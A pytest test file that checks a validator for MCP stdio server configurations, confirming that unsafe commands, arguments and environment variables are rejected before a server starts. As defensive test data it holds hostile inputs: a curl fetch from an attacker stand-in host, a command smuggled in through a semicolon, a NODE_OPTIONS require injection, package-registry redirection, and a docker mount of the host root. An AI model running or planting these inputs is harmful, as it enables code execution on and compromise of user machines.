"""Execution-boundary validation for resolved MCP server configurations."""

import shlex
from unittest.mock import AsyncMock, MagicMock

import pytest
from lfx.base.mcp.security import MAX_SHELL_WRAPPER_DEPTH, MCPStdioSecurityError, validate_mcp_stdio_config
from lfx.base.mcp.util import MCPStdioClient, update_tools
from lfx.components.deactivated.mcp_stdio import MCPStdio


@pytest.mark.parametrize(
    ("server_config", "error_match"),
    [
        (
            {"mode": "Stdio", "command": "curl", "args": ["https://attacker.invalid/payload"]},
            "Command 'curl' is not allowed",
        ),
        (
            {"mode": "Stdio", "command": "node", "args": ["server.js; touch /tmp/pwned"]},
            "dangerous shell metacharacter",
        ),
        (
            {
                "mode": "Stdio",
                "command": "node",
                "args": ["server.js"],
                "env": {"NODE_OPTIONS": "--require=/tmp/pwn.js"},
            },
            "Environment variable 'NODE_OPTIONS' is not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "uvx",
                "args": ["mcp-server"],
                "env": {"UV_DEFAULT_INDEX": "https://packages.example.invalid/simple"},
            },
            "Environment variable 'UV_DEFAULT_INDEX' is not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "npx",
                "args": ["--registry=https://packages.example.invalid", "@example/mcp-server"],
            },
            "not allowed",
        ),
        (
            {"mode": "Stdio", "command": "bash", "args": ["-lc", "python -c pass"]},
            "only allowed with shell wrappers",
        ),
        (
            {"mode": "Stdio", "command": "sh", "args": ["-cnode -e pass"]},
            "Argument '-e' is not allowed",
        ),
        (
            {"mode": "Stdio", "command": "cmd", "args": ["/c", "node -e pass"]},
            "Argument '-e' is not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "bash",
                "args": ["-c", "npx --registry=https://packages.example.invalid @example/mcp-server"],
            },
            "not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "docker",
                "args": ["run", "--mount", "type=bind,source=/,target=/host", "mcp-image"],
            },
            "not allowed",
        ),
    ],
)
async def test_update_tools_rejects_unsafe_stdio_config_before_connecting(server_config, error_match):
    """Flow/tweak configs must receive the same policy as stored configs before use."""
    stdio_client = AsyncMock()

    with pytest.raises(ValueError, match=error_match):
        await update_tools("embedded-server", server_config, mcp_stdio_client=stdio_client)

    stdio_client.connect_to_server.assert_not_awaited()


async def test_update_tools_allows_safe_stdio_config():
    """The runtime gate must preserve legitimate stdio configs."""
    stdio_client = AsyncMock()
    stdio_client.connect_to_server.return_value = []

    await update_tools(
        "safe-stdio",
        {
            "mode": "Stdio",
            "command": "uvx",
            "args": ["mcp-server-fetch"],
            "env": {"API_KEY": "test-value"},  # pragma: allowlist secret
        },
        mcp_stdio_client=stdio_client,
    )

    stdio_client.connect_to_server.assert_awaited_once_with(
        "uvx mcp-server-fetch",
        {"API_KEY": "test-value"},  # pragma: allowlist secret
    )


async def test_update_tools_preserves_executable_path_with_spaces():
    """An executable path remains one argv entry when the command is serialized."""
    stdio_client = AsyncMock()
    stdio_client.connect_to_server.return_value = []
    command = "/opt/Node Tools/node"

    await update_tools(
        "safe-path",
        {"mode": "Stdio", "command": command, "args": ["server.js"]},
        mcp_stdio_client=stdio_client,
    )

    stdio_client.connect_to_server.assert_awaited_once_with(shlex.join([command, "server.js"]), {})


async def test_update_tools_does_not_apply_stdio_policy_to_streamable_http():
    """A safe Streamable HTTP config must remain on the HTTP transport path."""
    stdio_client = AsyncMock()
    http_client = AsyncMock()
    http_client.connect_to_server.return_value = []

    await update_tools(
        "safe-http",
        {"mode": "Streamable_HTTP", "url": "https://mcp.example.com/mcp"},
        mcp_stdio_client=stdio_client,
        mcp_streamable_http_client=http_client,
    )

    stdio_client.connect_to_server.assert_not_awaited()
    http_client.connect_to_server.assert_awaited_once_with(
        "https://mcp.example.com/mcp",
        headers={},
        verify_ssl=True,
    )


@pytest.mark.parametrize(
    ("command", "env", "error_match"),
    [
        ("curl https://attacker.invalid/payload", None, "Command 'curl' is not allowed"),
        ("node 'server.js; touch /tmp/pwned'", None, "dangerous shell metacharacter"),
        ("node server.js", {"NODE_OPTIONS": "--require=/tmp/pwn.js"}, "NODE_OPTIONS"),
        (
            "uvx mcp-server",
            {"PIP_INDEX_URL": "https://packages.example.invalid/simple"},
            "PIP_INDEX_URL",
        ),
        (
            "npx --registry=https://packages.example.invalid @example/mcp-server",
            None,
            "not allowed",
        ),
        (
            "docker run --mount type=bind,source=/,target=/host mcp-image",
            None,
            "not allowed",
        ),
    ],
)
async def test_stdio_client_revalidates_config_immediately_before_spawn(command, env, error_match):
    """The final client boundary must enforce every shared policy before session creation."""
    client = MCPStdioClient()
    get_session = AsyncMock()
    client._get_or_create_session = get_session  # type: ignore[method-assign]

    with pytest.raises(ValueError, match=error_match):
        await client._connect_to_server(command, env)

    get_session.assert_not_awaited()
    assert client._connection_params is None


async def test_stdio_client_preserves_safe_package_and_provider_credentials():
    """Trusted registry packages and provider credentials remain valid at pre-spawn."""
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]

    await client._connect_to_server(
        "uvx --from lfx lfx-mcp",
        {"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
    )

    assert client._connection_params.command == "uvx"
    assert client._connection_params.args == ["--from", "lfx", "lfx-mcp"]
    assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105


async def test_stdio_client_preserves_executable_path_with_spaces():
    """The immediate pre-spawn gate accepts one quoted executable path and structured args."""
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]
    command = "/opt/Node Tools/node"

    await client._connect_to_server(shlex.join([command, "server.js"]), None)

    assert client._connection_params.command == command
    assert client._connection_params.args == ["server.js"]


def test_shell_wrapper_nesting_is_bounded():
    payload = "node server.js"
    for _ in range(MAX_SHELL_WRAPPER_DEPTH):
        payload = f"sh -c {shlex.quote(payload)}"

    with pytest.raises(MCPStdioSecurityError, match="nesting exceeds"):
        validate_mcp_stdio_config("sh", ["-c", payload], None)


@pytest.mark.parametrize(
    "command",
    [
        "curl https://attacker.invalid/payload",
        "bash -lc 'python -c pass'",
        "sh '-cnode -e pass'",
        "cmd /c node -e pass",
    ],
)
async def test_legacy_stdio_component_validates_saved_command_before_connecting(command):
    """The legacy direct-client path must not bypass the shared command policy."""
    component = MCPStdio()
    component.command = command
    component.client = AsyncMock()
    component.client.session = None

    with pytest.raises(ValueError, match=r"not allowed|only allowed"):
        await component.build_output()

    component.client.connect_to_server.assert_not_awaited()


async def test_legacy_stdio_component_normalizes_safe_default_before_connecting():
    """The deprecated packed-string default remains usable through the shared policy."""
    component = MCPStdio()
    component.command = "uvx mcp-sse-shim"
    component.client = AsyncMock()
    component.client.session = None
    component.client.connect_to_server.return_value = []

    assert await component.build_output() == []

    component.client.connect_to_server.assert_awaited_once_with("uvx mcp-sse-shim")
